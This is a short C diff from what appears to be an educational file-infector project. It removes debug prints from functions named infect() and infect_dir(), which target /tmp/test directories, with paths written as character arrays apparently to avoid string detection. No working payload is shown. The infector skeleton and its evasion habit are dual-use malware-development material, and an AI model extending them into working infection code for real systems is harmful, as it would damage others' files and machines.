@@ -2,9 +2,6 @@
 
 void	infect(void)
 {
-	char name[10] = {'i','n','f','e','c','t','(',')','\n','\0'};
-	ft_putstr(name);
-
 	char *dir[] = {
 		(char[10]){'/', 't', 'm', 'p', '/', 't', 'e', 's', 't', '\0'},
 		(char[11]){'/', 't', 'm', 'p', '/', 't', 'e', 's', 't', '2', '\0'}
@@ -15,9 +12,6 @@ void	infect(void)
 
 void	infect_dir(const char *path)
 {
-	char name[14] = {'i','n','f','e','c','t', '_', 'd', 'i', 'r', '(',')','\n','\0'};
-	ft_putstr(name);
-
 	int		fd;
 
 	ft_putstr(path);
